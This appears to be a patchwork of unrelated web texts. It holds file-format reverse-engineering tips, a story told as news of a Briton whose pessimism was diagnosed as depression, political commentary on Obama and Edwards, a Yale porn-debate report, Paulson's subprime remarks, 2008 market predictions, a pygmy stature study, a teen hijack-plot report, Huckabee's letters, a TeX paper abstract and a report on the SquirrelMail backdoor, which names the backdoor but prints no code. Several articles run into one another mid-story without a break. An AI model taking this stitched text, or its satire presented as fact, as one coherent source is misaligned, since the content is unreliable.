Good understanding of how numbers and strings are represented in binary manner .
Excellent command of the C programming language .
Besides this , you also need :
a computer ( quite obvious ) ,
a simple text editor capable of handling long lines ,
( optional ) a hex viewer or editor ,
a calculator with hexadecimal - to - decimal conversion and vice - versa functionality ,
a C or C++ compiler ,
enough sample files about which you know what data they contain , and
( optional ) the application which uses the files .
What is the fun ?
Programming style
Some practical remarks :
Document your code ( either through comments or , better , by giving meaningful names to variables and procedures ) .
Make regular back - ups .
Although this should be a standerd procedure , with cracking a file format you will see yourself more often going back to an earlier version of the program whenever you get stuck in a certain area .
Build into your program switches ( simple Boolean variables ) which allow you to dump any intermediate data during any stage of the parsing .
You will find that you often need to go back one step to make a step forward .
How to work
Where to start
printf ( " %02X " , byte ) ; printf ( " %02X " , byte ) ; printf ( " % c%02X " , ( byte > ' ' && byte < 127 ) ? byte : ' ' , byte ) ; printf ( ( byte > ' ' && byte < 127 ) ? " %c " : " %02X " , byte ) ;
byte
unsigned char
For a primary investigation of a format , the strings program might be useful .
Sometimes binary format contain whole chunks of text .
Block structure
Number representation
Negative integers
An important advantage of the 2 - compliments notation is that the arithmetic operations for the signed and unsigned representation are exactly the same .
The only time the difference become obvious is when a number is cast to a larger representation form .
For example the hexadecimal byte value 0xFF needs to be changed to 0xFFFF , when the signed number - 1 is cast from a byte to a word , and has to be changed to 0x00FF , when the unsigned number 255 is cast from a byte to a word .
In a binary file format , it can occur that a unsigned byte value is stored as a word with the signed expansion applied .
As a result of this it can happen that 127 is stored hexadecimal as 0x007 F , where 128 is stored hexadecimal as 0xFF80 .
little and big endian
floating point formats
float
double
Strings
Packed format
More often it happens that a number of Boolean values are stored in a single byte or word .
Sometimes it can be helpful to print numbers in their binary representation .

The difference strategy
You can use a Binary File Compare utility to compare the files and discover how certain changes are reflected in the binary file , which gives you information about the where the information is stored .

The Utne Reader has a shocking article on a near medical tragedy – a misdiagnosis of depression that led to inappropriate medication and the patient almost being given electroshock treatment .
Luckily , one of the more cultural sensitive of the medical staff noticed the patient ’s normal behaviour was being inappropriately pathologised as mental illness .
George Farthing , an expatriate British man living in America , was diagnosed as clinically depressed , tanked up on antidepressants , and scheduled for a controversial shock therapy when doctors realized he was n’t depressed at all , he was just British !
Farthing , a man whose characteristic pessimism and gloomy perspective were interpreted as serious clinical depression , was led on a nightmare journey through the American psychiatric system .
Doctors described Farthing as suffering from pervasive negative anticipation : a belief that everything will turn out for the worst , whether it ’s trains arriving late , England ’s chances of winning any national sports events , or his own prospects of getting ahead in life .
The doctors reported that the satisfaction he seemed to get from his pessimism was particularly pathological .
You can read the full story at the link below for all the shocking details .
Of course , it would be churlish not to mention Whybrow and Gartner ’s theory that the personality of the American people reflects the fact that they have a greater genetic propensity for mania .
Yes , they are being serious .
You may wish to insert your own comment about the genetic propensity for irony at this point .

Did John F. Kennedy ride the winds of change into office or was he the “ wind beneath our wings ? ”
Either way , his election signified that , back on firm peace - time footing after President Eisenhower ’s two terms , America was ready to move ahead with “ great vigah . ”
With his uplifting oratory and youthful good looks , Barack Obama has drawn comparisons to Kennedy .
Nor has he been quick to disabuse us of the notion that he can recover JFK ’s fallen torch .
For instance , in the spirit of JFK ’s legendary challenge to “ Ask not what your country can do for you ; ask what you can do for your country , ” Barack issued a “ call to serve ” back in July .
Describing we Americans as “ our greatest resource — not our bombs , guns , or dollars , ” he promised to increase national service opportunities if elected .
He ’d double the size of the Peace Corps and expand the AmeriCorps program .
Also , he ’d create a Craigslist - like network to connect volunteers , including retirees , with opportunities for service .
The first to make the “ linkage [ between Kennedy and Obama ] explicit and [ give ] it official sanction , ” according to the Telegraph of London was , Kennedy ’s chief speechwriter and long - time associate , Theodore Sorensen .
“ Mr Kennedy reached the hearts of voters , ” said Sorensen .
“ And so does Obama . ”
He gave short shrift to the “ experience ” question that dogs Obama .
“ Judgment is the single most important criterion for selecting a president .
. . ” which , Sorensen continued , Obama “ demonstrated in his position against the Iraq war even before it started . ”
It ’s one thing when a non-politician who also happens to be Caroline Kennedy , weighs in with a New York Times oped this Sunday bearing the none - too - subtle title , “ A President Like My Father . ”
“ I have never had a president who inspired me the way people tell me that my father inspired them , ” she writes .
“ I believe I have found the man who could be that president . ”
But it ’s another when experienced Washington hands like not only Sorensen but Gregory Craig , one of Bill Clinton ’s impeachment lawyers , who might logically be expected to support Hillary , are swept away by Obama .
“ The election of Obama will not only change the players in Washington , ” Sorensen said .
“ It ’ll change the game itself . ”
Hold on there , old - timer .
That ’s light years beyond what the election of Kennedy , who was more of a walking , talking zeitgeist than a man with a plan , accomplished .
In fact , what Sorensen is conjuring up sounds more like a new Mikhail Gorbachev .
Gorbachev ?
A Russian leader ?
Not the Gorbachev who dragged his feet on withdrawing from Afghanistan and who , aside from freeing high - profile dissidents , failed to inspire with his record on human rights .
But the Gorbachev of glasnost ( government transparency and freedom of information ) and perestroika ( restructuring of the economy ) .
As well as the Gorbachev who yielded to the Eastern bloc ’s nations to determine their own affairs .
In another words , we need a president who will roll back the secrecy of the Bush years and break up the media monopolies .
Also , he needs to take the economy apart and put it back together again .
Okay , so Gorbachev did n’t do too well with the second part .
But we ’re not asking Obama to dismantle capitalism as the then - Soviet leader did socialism .
Empower financial regulators , reduce our military commitment overseas , and draw down the defense budget and he ’d be off to a good start .
All of these reforms are rendered moot , however , if we ’re not around to enjoy them .
If , that is , the ensuing “ Great Society , ” to borrow a term from JFK ’s successor , Lyndon Johnson , were laid low by a nuclear attack on an American city ( or seven , if al Qaeda had its way ) .
This is the territory into which Gorbachev launched his most daring raids .
First , in 1985 , he announced that the Soviet Union would no longer deploy intermediate - range nuclear forces ( INFs ) in Eastern Europe .
Later that year , he proposed that both his country and the US slice their nuclear arsenals in half .
The next year , at the memorable Reykjavik summit , Gorbachev got Ronald Reagan to agree in principle to his plan for removal of all INFs from Europe , as well as to draw them down worldwide .
Caught up in Gorbachev ’s enthusiasm , Reagan expressed a willingness to join Russia in eliminating all nuclear weapons in 10 years .
In the end , though , Reagan clung to his blankie , the Strategic Defense Initiative ( Star Wars ) .
Gorbachev feared SDI would lead to nukes in space , not to mention leave the Soviet defense establishment with the impression he ’d been played .
Their dreams of saving the world came crashing back down to earth .
Still , the summit paved the way for the signing of the Intermediate - Range Nuclear Forces Treaty in 1987 .
Between the two nations , almost 2,700 of the weapons were destroyed within four years .
Where does Obama stand on nuclear weapons ?
He ’s worked with Senator Dick Lugar on his and Sam Nunn ’s Nuclear Threat Initiative , which provides for locking down nuclear materials in the former Soviet states .
However unrealistically , he seeks to make that a done deal by the end of his first term .
( Though when it comes to nuclear terrorism , Hillary Clinton has seen Obama and raised him with her plan to create the position of Senior Advisor to the President for the Prevention of Nuclear Terrorism . )
Obama also seeks to abolish intermediate - range nuclear weapons once and for all .
Furthermore , he plans to end the production of highly enriched uranium , ensure that all nuclear weapons are removed from high alert , and build no new weapons .
Sounds promising .
Still , in his self - appointed incarnation as the repository of all our hopes , Obama must take the next step .
We need nothing less than a leap of faith into a future with no nuclear weapons , their budgets freed up for social programs .
One can counter that , with terrorism , times have changed .
But , during the Reagan years , the US was arming itself to the teeth ( to bankrupt the Soviet Union , remember ? ) .
In fact , Russian military leaders actually thought we were planning a first strike .
Yet Gorbachev ’s response to the extremities of that threat could n’t have been , by most standards — especially American — more counter - intuitive .
He sought to disarm .
In “ Arsenals of Folly ” ( Knopf , 2007 ) , the third in his proposed quartet on the nuclear age , Richard Rhodes reprints a letter Gorbachev wrote .
Obama would do well to heed his words :
“ Do n’t think that something will stop me , that there is a threshold through which I shall not be able to pass . ”
“ I accept without embarrassment .

Yale Student : ' I 'm Here ' Cause I Love Porn ' Porn stars and porn preachers engage in fiery " Face - Off " during Sex Week .
Feb 19 , 2008  --
Yale University is the academic home to numerous Pulitzer Prize winners and Nobel laureates , several U.S. presidents , senators and award - winning actors .
On Friday , the college , which is also known as a hotbed for student debate and political discourse , held a discussion on an unlikely topic — porn .
As part of " Sex Week at Yale University , " two divergent sides met for the second " Nightline Face - Off , " in which they asked the question : Is America addicted to porn ?
" Porn king " Ron Jeremy along with Vivid porn star Monique Alexander squared off against " porn pastor " Craig Gross and former porn producer Donny Pauling .
Nearly 500 students , alumni and a smattering of current porn stars filed in to the LoRicco Ballroom located just outside of Yale 's sprawling New Haven campus .
Sporadic chants of " We love Ron " filled the stairwells as students waited in line .
Porn detractors arrived wearing " Porn is Bipartisan " T - shirts and waving anti-porn signs .
" This has been the most hyped event of our Sex Week here at Yale , " said one freshman male .
" I 'm excited to see Ron Jeremy in an academic setting .
I 'm coming in with an open mind , not really knowing what to expect . "
Other students were a bit more biased .
" I 'm just here ' cause I love porn , " said Constance , a freshman English major .
" And I 'm not ashamed to say it at all . "
The debate , moderated by ABC News ' Martin Bashir , highlighted the vast differences in both sides .
Jeremy and Alexander argued for their right to free speech and the importance of free will , while the porn detractors shared anecdotes highlighting the dark side of the porn industry .
After the initial arguments and several heated moments , the debate was opened to Yale students .
Hands shot up , and many students asked questions on a variety of topics .
Alexander , who at 25 has been in the porn industry since she was 18 , was asked what her parents thought of her career .
Another student asked about the prevalence of amateur pornography .
Porn Industry Still Booming
There 's no question that pornography is a booming business in the United States .
Despite a decline in the sales and rentals of porn videos , it 's still a multibillion - dollar industry , and the rise of amateur videos , revenue - sharing Web sites such as XTube.com and technological advances bringing pornography to your cell phone and beyond means that porn is as prevalent as ever .
The Adult Video News Media Network , a trade publication , estimates that the industry earns $ 14 billion annually .
The adult film industry may be innovating and evolving , but is porn really just another form of entertainment , or is it an addiction ?
Is porn dangerous or harmless ?
Is it necessarily degrading to women , or could it be empowering ?
In 2006 , " Porn King " Ron Jeremy and " Porn Pastor " Craig Gross embarked on a series of debates about porn in America , organized through Wolfman Productions .
They have held 16 debates to date on the pros and cons of pornography , including debates at college campuses such as Ohio State University , Colorado College and the University of Missouri .
Last spring , the first " Nightline Face - Off : Does God Exist ? " pitted actor and evangelical Kirk Cameron and his partner at the Way of the Master against two self - proclaimed atheists .
The second " Nightline Face - Off " features Ron Jeremy and Vivid porn star Monique Alexander on the pro-porn side , while Craig Gross and former porn producer Donny Pauling argue the anti-porn side .
Porn Is Healthy
Jeremy , 54 , has appeared in more than 1,800 adult films and is listed in the Guinness World Records for " Most Appearances in Adult Films . "
He is also the author of an autobiography and has appeared on the VH1 reality show " The Surreal Life . "
" " I think porn is healthy , " Jeremy said in one XXX Porn Debate .
" It 's all part of that wide world of entertainment , nothing more , nothing less , " he added .
Jeremy 's goal ?
" We want happy , healthy people watching porn recreationally , " he said at one debate .
Jeremy was be joined by 25 - year - old porn actress Monique Alexander , who is under contract with Vivid Entertainment .
Alexander became a dancer at the age of 18 and has been working in the adult industry since 2001 .
" I am perfectly fine , " Alexander said , adding that she thinks " porn is a lot more acceptable now . "
She believes pornography actually gives women more power and control .
" We get paid more money than the men , " she said .
" We have more say so . "
Alexander said couples approach her to thank her for her films because they have helped spice up their relationships .
" It 's just sex , " Alexander said .
Porn Is Dangerous
Five years ago , Craig Gross , a seminary - trained evangelist , created an online fellowship called XXXChurch.com , originally intended to serve as a resource for Christians who were struggling with pornography .
The Porn Pastors , as Gross and his co-founder call themselves , now target their preaching at members of the porn industry , encouraging them to turn away from the sex industry and seek salvation .
Gross said they are obeying the great commission at the end of Matthew 's Gospel to " go and make disciples of all nations . "
" I think that God is using people that work with XXX Church to carry about his message , to carry out his plan , " Gross told " Nightline " in a 2007 interview .
The Porn Pastors believe porn is dangerous for society -- delusional for men and disrespectful to women .
They say the fantasy of porn inhibits people from building and sustaining meaningful relationships .
" When you get in a relationship with a real woman , you 're not going to know what to do , " Gross said during one debate .
" Porn is a lot easier than sex , especially now with the Internet , " Gross told " Nightline . "
" You can get it when and where you want it … and so what we see is people resort to the pornography , even when they are married and they could have a great sexual relationship . "
Joining Gross in the " Face - Off " was former porn producer Donny Pauling .
Pauling worked in the industry for nearly a decade , producing thousands of hours of material .
But in September 2006 , two years after he was first contacted by XXXChurch and began to re-examine Christianity , Pauling said he turned away from the industry and turned his life over to God .
On his Web site , donnysramblings.com , Pauling writes that he was driving home after landing a new and lucrative deal when " God just reached out and touched me , " and " I instantly lost all desire to produce porn . "
WASHINGTON ( MarketWatch ) --
About 45,000 out of 1.8 million at - risk subprime borrowers have asked for help to refinance their mortgage under an industry - wide plan to prevent foreclosures , Treasury Secretary Henry Paulson said Monday .
In a speech in New York , Paulson said the Treasury - backed plan to prevent subprime foreclosures has now been joined by firms representing 90 % of the subprime market .
Within a few weeks , the industry will begin " fast - tracking " some qualified borrowers into new , affordable loans , Paulson said .
The effort could be extended to other adjustable - rate loans , not just subprime loans , Paulson suggested .
" A housing correction was inevitable and necessary , " Paulson said .
In brief remarks on the economy , Paulson said he expected it to " continue to grow . "
" Our economy remains resilient , " he said .
Paulson repeated his call for Congress to pass legislation to allow the Federal Housing Administration and the government - sponsored entities of Fannie Mae FNM , +0.85 % and Freddie Mac FRE , - 0.64 % to handle more loans .
Paulson encouraged banks and other financial institutions to strengthen their balance sheets and raise more capital if necessary .
" This is market discipline in action and should enhance market confidence over time , " he said .
" It is a positive for financial institutions , capital markets and our economy . "
While some have worried that big U.S. financial firms are being sold off to foreigners , Paulson said he was n't worried .
" When the world invests in the United States , it is the ultimate vote of long - term confidence in our economy and our companies . "
Paulson noted improvement in short - term credit markets in recent weeks .
Central banks ' efforts to flood the financial system with short - term loans " are having their desired effects , " the former Goldman Sachs chairman said .
" The spread between Libor and fed funds futures has shrunk significantly " and " there has been progress in the asset - backed commercial paper market . "
The White House wo n't rush to propose new ideas to supervise financial markets or to stimulate the economy , Paulson said .
" Working through the current situation and getting the policy right is more important than getting the policy announced quickly , " he said , in excerpts of a speech planned for later Monday .
President Bush hinted in an interview last week that his administration is contemplating a fiscal stimulus program , which would likely be announced at the State of the Union speech later in January .
Fiscal policy generally refers to federal taxing and spending .
" Let me be clear that no single policy or action will undo the excesses of the last few years , " Paulson said .
Normally , in an election year , you can count on the sitting president , even a lame duck , to prop up the economy with discretionary spending and tax breaks that give voters an incentive to reelect the party in power .
That usually translates to a rosy stock market .
But not this White House .
And not this stock market .
The president ’s been blessed with a good economy for five years , so good that the administration has n’t had to focus on it .
Now that it has to , because of a massive housing crisis it should have prevented , the administration is once again displaying its knack for gross incompetence .
It needs aggressive help from one man , Federal Reserve chairman Ben Bernanke , who needs to slash rates quickly if Bush and company want to save the country from a recession and prevent a clean sweep by the Democrats , whoever gets the nomination .
But the Fed chairman ’s not playing ball .
He ’s the paragon of caution when caution ’s the most reckless course .
That ’s how quickly housing ’s contagion has spread , thanks to tight money and reduced spending .
Between the president ’s ineffectuality and Bernanke ’s rank amateurism , we ’re at the mercy of a struggling economy and , perhaps , for the first time in a half - dozen years , facing a down stock market .
That does n’t mean we ca n’t make money in 2008 .
It does , however , mean that the average stock will find it tough sledding for a while , and , unless the Fed starts waking up , you may be better off waiting to buy until we see lower prices later in the year .
With that somewhat grim backdrop , let ’s take a look at what could happen , and how to profit from it , even if it ’s best to wait a while to jump in .
What follows are my top - ten financial predictions for 2008 — some mortal locks , others long shots , in that order .
1. Goldman Sachs makes more money than every other brokerage firm in New York combined and finishes the year at $ 300 a share .
Not a prediction — an inevitability .
In fact , it ’s only January , and I think it ’s already come true .
2 . Oil goes much higher , maybe as much as $ 125 a barrel .
That sends gasoline to $ 5 a gallon , even at those terrific service stations outside the Holland Tunnel .
Pundits keep blaming the endless rise on geopolitics , but in the latter half of 2007 , we saw reduced tension in Iraq , Iran , and Venezuela , plus flat - out production by the Saudis and the Russians , and all that happened is the price went from the $ 70s to the $ 90s .
We are running out of oil more quickly than people can imagine , and that means great returns for oil companies .
Just buy the stock of the company you filled up at today or buy a driller ( Transocean ’s my favorite ) , then sit back and make money .
The odds oil will rise ?
Two to 1 .
The $ 125 - per - barrel target might be pushing it , but higher oil is pretty much a sure thing .
3 . The Fed arranges an Arabic Heimlich maneuver on Citigroup , so the banking giant does n’t choke on the worst mortgage portfolio in the country .
Rather than face the demise of the biggest U.S. bank , and the panic its fall could trigger , Congress looks the other way as Arab investors buy 51 percent of the somnambulant bank .
Unfortunately for Citigroup , I ’d lay 3 to 1 on this happening .
I say “ unfortunately , ” but I should n’t .
It ’s unfortunate that a proud institution basically has to give up its autonomy , but its stock would go up considerably once it got that capital .
4. Verizon becomes your cable provider .
In one of the most remarkable frog - to - prince transformations I ’ve seen , Verizon CEO Ivan Seidenberg offers an alternative , Fios , that is better and cheaper than anything Time Warner , Cablevision , or Comcast can produce .
Throw in Verizon ’s growing cell - phone business and growth accelerates dramatically , making VZ the best - performing stock in the Dow Jones averages .
Time Warner and Comcast hit new lows , and the retreat of cable begins .
Sorry , cable guys :
We ’re looking at 4 to 1 here .
5 . In the first real debacle of the private - equity era , Cerberus Capital Management , the quiet hedge - fund king , fails in its bid to resuscitate Chrysler — not a surprising turn , given that it picked Bob “ I ruined Home Depot and all I got was $ 200 million ” Nardelli to run the country ’s worst car company .
The combination of Chrysler and the 51 percent of GM ’s lousy mortgage business that it paid top dollar for forces former Treasury secretary John Snow to seek a bailout for Cerberus .
Amazingly , given the love of hedge - fund contributions by both parties , Congress agrees and writes checks for billions to save Cerberus ’ wealthy investors .
Call the Chrysler failure a lock .
The bailout ?
I ’d say 5 to 1 .
6 . Google continues its dominance and becomes one of the top three companies in the U.S. in market capitalization .
It doubles its advertising share , at the expense of television and print .
It also successfully challenges Microsoft for operating - system dominance .
Microsoft calls for a government investigation of Google ’s power , but no one cares because Microsoft is just too hated for anyone in Washington to champion .
The stock roars to $ 1,000 .
I like Google enough to put this one at 7 to 1 .
If you use an $ 800 target , make it 5 to 2 .
7. European companies , eyeing the weak dollar , snap up New York real estate , and offer to buy Merrill Lynch and JPMorgan .
John Thain and Jamie Dimon , the companies ’ respective CEOs , agree to the bids ( Thain sold a chunk of stock to a foreign entity just last week ) .
Colgate , Clorox , Whirlpool , and Black & Decker get snapped up , too .
All six companies ’ stock prices head north .
Lots of moving parts , but let ’s put the odds of at least one of these deals happening at 3 to 1 .
A perfect Pick Six pays 50 to 1 .
8 . Apple completes its dominance of the music business , as the music producers decide no longer to produce new CDs .
It ’s just too expensive for them .
Warner Music Group files for bankruptcy .
Apple goes to $ 300 .
Okay , these may not be 2008 events , but they will happen , sooner rather than later .
This year : 25 to 1 .
Next year : 5 to 1 .
9 . The New York Times , after spending several hundred million dollars buying back its stock while it was in the $ 30s and $ 40s , slashes its dividend in half because of a cash shortage .
The stock drops to $ 10 .
To save the world ’s greatest newspaper , the company accepts a buyout offer from Mayor Michael Bloomberg at $ 20 a share .
Do n’t be so quick to scoff :
The cash is spare change for Bloomberg , who , do n’t forget , already owns a small media company .
I ’d say the $ 10 share price is even money .
That ’s how bad it is at the Times .
The Bloomberg buyout is probably a 100 - to - 1 shot , but may be less if he decides not to run for president and needs something else to do this year .
10 .
An Army of the Foreclosed marches on the White House , then launches a siege at the Federal Reserve , before camping out in front of the Washington Monument .
The army demands relief from eviction .
Bernanke , recognizing that he did nothing to regulate the mortgage mess in 2006 and then did not cut rates fast enough in ’ 07 , resigns .
The siege ends , the new guy slashes rates , and the market takes off .
Here , the odds are 1,000 to 1 ( as Marx taught us , people have a hard time losing their chains ) .
But if Bernanke or a future
Fed chair does cut rates meaningfully , here ’s a sure bet :
That ’s the time to start buying .

The question is controversial .
Traditional explanations attribute pygmies ' small stature to minimizing caloric requirements and walking in dense forests .
However , a new study by researchers at the University of Cambridge suggests that there are some problems with this explanation , and offers an alternative hypothesis .
Human pygmy populations are defined by an average male height of less than 5 feet ( 155 cm ) .
By this definition , a wide range of pygmy societies exist today in parts of Africa , Malaysia , Thailand , Brazil , and Bolivia – different environments that do n’t match the traditional hypotheses for small body size .
Besides the differences within pygmy populations , there are also some non-pygmy populations that face some of the same physical challenges as pygmies but have n’t evolved a short stature .
For example , many human populations live in dense forests and experience regular food shortages , and yet these populations have larger body sizes .
Now , scientists Andrea Migliano , Lucio Vinicius , and Marta Lahr have performed a study on two pygmy groups from the Philippines , the Aeta and the Batak , and concluded that there may be a better explanation for pygmies ’ short stature .
Their study is published in a recent issue of the Proceedings of the National Academy of Sciences .
The researchers point out that one characteristic unique to but common among many pygmy populations is their short lifespan compared to other humans .
With this in mind , the researchers suggest that pygmies represent the “ fast ” extreme of life history strategies , with short stature being a side effect .
“ We first thought that we would find a relationship between small body size and increased fitness in pygmies – for example , that the shorter pygmies would have more advantages , such as higher fertility , than the taller ones , ” Migliano told PhysOrg.com .
“ However , the smaller pygmies had lower fertility than the taller pygmies .
So this gave us the idea that perhaps there was no advantage in being short among pygmies .
“ Then , when I went to the field , and started to interview them , I noticed the very high mortality rates – really high compared to any other population , ” she said .
“ So when we checked that different pygmy groups followed the same pattern , we thought that these facts should be linked .
Also , life history theory has been used for a long time to understand body size diversity among mammals , and we thought it should also apply to the understanding of human diversity . ”
Because of their short life expectancies , the researchers speculate that pygmies have had to shift their reproductive years forward .
The average life expectancy at birth for different pygmy populations ranges from just 16 years to 24 years .
Very few pygmy women reach the end of their reproductive period , as only a small percentage survive past age 40 .
In order to compensate for the lack of older reproductive women , natural selection has shifted the reproductive period forward .
The fertility peak of age at first reproduction in the Aeta is around 15 years old , which reduces generation time and compensates for their short lifespan .
In order to make this fertility shift , pygmies must reach full maturity faster than longer - lived human populations .
For this reason , many pygmies stop growing at about age 12 , several years earlier than other humans .
Their childhood growth rate is n’t any more or less rapid than the growth rate of other ( traditional ) humans ; pygmy youth are roughly the same size as non-pygmy youth .
( This is the opposite of what is observed in cases of nutritionally induced stunting , where humans delay growth but achieve adult body size later ) .
Instead of experiencing the “ teenage growth spurt , ” pygmies ’ growth is simply truncated .
Migliano also explained why pygmies ’ growth rates do n’t increase in the early years to compensate for their truncated growth at an early age .
“ I think that , besides the high mortality , they have very low calorie intake , so it is a combination of the two factors that lead to the different phenotypes , ” she said .
“ The pygmies grow in the same rates as the Turkana [ eastern African Pastoralists ] , who also suffer from poor nutrition – but because the Turkana have longer life expectancy , they have time to grow for longer and achieve larger body size .
I would expect that a population with high mortality and high resources would grow fast and taller . ”
In other words , human height in general is partially influenced by lifespan .
Still , the life history hypothesis leaves a few unanswered questions .
For one , what originally caused the extremely high mortality rates among pygmies ?
The researchers suspect that the traditional hypotheses of environment , nutrition , thermoregulation , and other challenges may jointly or partially contribute to the high mortality rates observed in a wide variety of pygmy populations .
In that case , the traditional explanations may be indirect causes of pygmies ’ short stature , although the chain of effects would be much more complex than originally thought .

( CNN ) --
Authorities have charged a teenage boy who said he planned to hijack a commercial jetliner in an attempt to commit suicide , an FBI spokesman told CNN late Thursday .
The 16 - year - old was taken into custody by airport police without incident on Tuesday evening after flying from Los Angeles , California , to Nashville , Tennessee , on Southwest Airlines Flight 284 .
" His stated intent was to hijack the airplane and commit suicide , " said George Bolds , an FBI spokesman in Memphis , Tennessee .
" He did indicate he intended to die in Louisiana .
It appears he had a ticket to Louisiana . "
Bolds said the boy indicated he had lived in Louisiana .
The teen wanted to crash the plane into a Hannah Montana concert in Lafayette , Louisiana , two CNN television affiliates in Nashville , WSMV and WTVF , reported , citing unnamed sources .
The concert is scheduled for Friday night at the Lafayette Cajundome .
Bolds said he had no information on whether the concert may have been targeted as part of the plot .
In the teen 's possession were handcuffs , duct tape and a type of rope or yarn , according to the FBI .
Authorities noted that those are not prohibited items .
" His plan contemplated overpowering the flight crew , " Bolds said .
The teen is being held on unspecified state charges and could face federal charges as well , Bolds said .
CNN affiliate WTVF reported the teen has been charged with felony terrorism and is being held at the Davidson County juvenile detention center .
" It is my understanding that at no point in time during the course of the flight there was ever any safety concern , " Southwest Airlines spokesman Chris Mainz said .
Bolds also said nothing threatening occurred on the flight from California to Nashville .
It was not immediately clear how police became aware of the teen 's presence on the flight or his alleged suicide plans .
" Hannah Montana " is a hit Disney Channel show -- which stars 15 - year - old Miley Cyrus and her country singer dad , Billy Ray Cyrus -- about a teenage girl who is a typical high - schooler by day but has a secret pop -star alter ego by night .

Leaked letters show Huckabee sniping at critical reporter John Byrne
Published : Thursday December 20 , 2007

The former editor of the alternative Arkansas weekly Arkansas Times Max Brantley has released copies of letters he received from Mike Huckabee , the state 's former governor and lieutenant governor , in which the future Republican presidential candidate snipes at him for what he considered overzealous coverage .
The letters , released to The New Republic , show a Huckabee meticulous in responding to his critic 's attacks .
" In a series of unpublished private letters dating to the mid-'90s that Huckabee faxed to Brantley , a surprising -- and furious -- side of the former governor comes through , " writes the magazine 's Gabriel Sherman .
" The four letters , which Brantley provided to The New Republic , are multi-page , rambling , and highly personal attacks that Huckabee wrote while in Arkansas office .
In them , he excoriates the journalist , referring to the Arkansas Times as ' a local version of the National Enquirer , ' a ' collection of carping columnists , ' a ' newsletter for the Democrats , ' an " irrelevant irritant ; and the ' Theater of the Absurd , ' among other sobriquets . "
" I was just astounded at how vindictive he was , " Joan Duffy , a reporter who covered Huckabee for a Memphis paper in the 1990s told Sherman .
" He took it all so personally .
. . .
You 're either with him , or you 're a mortal enemy . "
In response to a Brantley Freedom of Information Act ( FOIA ) request for all of the then - lieutenant governor 's public documents in 1995 while he was on vacation , Huckabee replied : " If you have singled out the only Republican among constitutional officers for this special ' honor , ' then you 've really disguised your intentions about as effectively as trying to hide Dolly Parton in a 32 AA bra . "
" If you are so juvenile as to FOI my schedule as a result of your not getting my staff to call me away from my family on my birthday so you can get information you could use against me in a column , then do it , " Huckabee added .
" I frankly do n't give a rat 's rear as to your regard for me as a public official , because you apparently will never overcome your boorish behavior toward those whose opinions you cannot challenge on a responsible or intellectual basis .
" Huckabee later released the records .
" I 'm sure you 're delighted to discover that you effectively ruined what had otherwise been a really nice week in my life , " Huckabee wrote .
" Given the tone of your writing , you 're just the kind of person who would truly take pleasure in such a thing . "

2007 will go down as another record year for the wind energy industry , according to projections from the American Wind Energy Association ( AWEA ) .
The AWEA estimates the industry will install a record 3,000 MW of new wind power capacity in 2007 -- and for the first time produce enough total energy to supply more than 3 million American homes .
2007 was also a year of other important wind energy milestones .
Texas surpassed California as the nation 's largest generator of wind power and conventional oil and gas companies and Shell expanded into renewable wind energy .
Toward this end , Mr. Edwards called at the time for establishing a more effective program to train Iraqi troops and channeling reconstruction work to Iraqis instead of American contractors .
While he called for removing a significant number of American forces , he also emphasized that the withdrawals should be “ a gradual process . ”
“ That will still leave us with enough military capability , combined with better - trained Iraqis , to fight terrorists and continue to help the Iraqis develop a stable country , ” he wrote .
In the interview on Sunday , Mr. Edwards said that he decided on his current plan for a rapid and near - total withdrawal of American troops because of the failure of Iraqi leaders to achieve a political accommodation over the past four years .
Eight to 10 brigades , which is likely to be the bulk of the American combat force by the time the next president takes office , would immediately be withdrawn .
“ I absolutely believe this to my soul : we are there propping up their bad behavior , ” he said .
“ I mean really , how many American lives and how much American taxpayer money are we going to continue to expend waiting for these political leaders to do something ?
Because that is precisely what we are doing . ”
Such a troop withdrawal , he said , might jolt Iraqi leaders into taking action to overcome their sectarian differences .
During the 10 months or so while American troops were being withdrawn , Mr. Edwards added , he would also mount an intensive effort to encourage Iraq ’s leaders to engage in political reconciliation and solicit the cooperation of Iran and Syria , who he argued might be more willing to help once they understood that American troops were on their way out .
Mr. Edwards , who has never visited Iraq , said he asked the Pentagon last year to help arrange a visit but was turned down .
( Mr. Obama visited Iraq once two years ago , while Mrs. Clinton has made three trips . )
Geoff Morrell , the senior Defense Department spokesman , said the Pentagon had turned down all requests to visit Iraq from politicians who are not currently serving in Congress or as governors , including Rudolph W. Giuliani , a candidate for the Republican nomination .
At his campaign stops on Sunday , Mr. Edwards sought to highlight his knowledge of foreign policy by recounting his recent telephone call with Pakistan ’s president , Pervez Musharraf , a conversation Mr. Edwards initiated as soon as he learned of the death of Benazir Bhutto .
Iraq was not part of his prepared remarks , save for a denunciation of greedy military contractors .
But Mr. Edwards outlined his plan to remove American troops from Iraq during a question - and - answer session with voters .

Top ten gadgets every designer SHOULD live without
As a designer , you ’re probably familiar with all these gadgets that are available in various online stores – some are useful , some quite brilliant and a few downright indispensable .

A Functional Description of TeX's Formula Layout
Reinhold Heckmann and Reinhard Wilhelm
Abstract
While the quality of the results of TeX's mathematical formula layout algorithm is convincing , its original description is hard to understand since it is presented as an imperative program with complex control flow and destructive manipulations of the data structures representing formulae .
In this paper , we present a re-implementation of TeX's formula layout algorithm in the functional language SML , thereby providing a more readable description of the algorithm , extracted from the monolithical TeX system .

The backdooring of SquirrelMail

SquirrelMail advertises itself as " webmail for nuts . "
It is a PHP - based package which is in wide use ; most distributions include a SquirrelMail package .
Security problems in SquirrelMail are certainly not unheard - of ; even so , the announcement that the source distribution for version 1.4.12 had been compromised raised some eyebrows .
Initially the project downplayed the problem :
Further investigations show that the modifications to the code should have little to no impact at this time .
Modifications seemed to be based around a PHP global variable which we cannot track down .
The changes made will most likely generate an error , rather than a compromise of a system in the event the code does get executed .
It only took one day , though , before Uwe Schindler pointed out that , in fact , the changes made to the source opened a remote - execution back door into deployed SquirrelMail systems .
Somewhere along the way , the project discovered that the 1.4.11 release had also been tampered with .
The SquirrelMail developers released version 1.4.13 to close the vulnerabilities .
There have not been any public reports of systems being compromised by way of this vulnerability .
Additionally , it would appear that all of the distributors which shipped the affected versions got their version of the code prior to the attack .
So the episode would appear to have ended reasonably well - as far as we know .
There are some lessons that one can take from this attack , though .
The downplaying of the problem initially was a potentially fatal mistake .
If somebody has been tampering with the sources , there is no excuse not to go into red-alert mode immediately , even if the developers involved do not understand the attack .
When a project has been compromised at such a fundamental level , one must assume the worst .
The compromise was discovered after a user noticed that the tarballs on the download site did not match the posted MD5 checksums .
Your editor suspects that very few of us actually verify checksums in the packages they take from the net .
Doing so more often would be a good exercise in software hygiene for all of us .
That said , the project got lucky this time around .
A smarter attacker would have replaced the checksums after adding the back door , making the changes harder to detect .
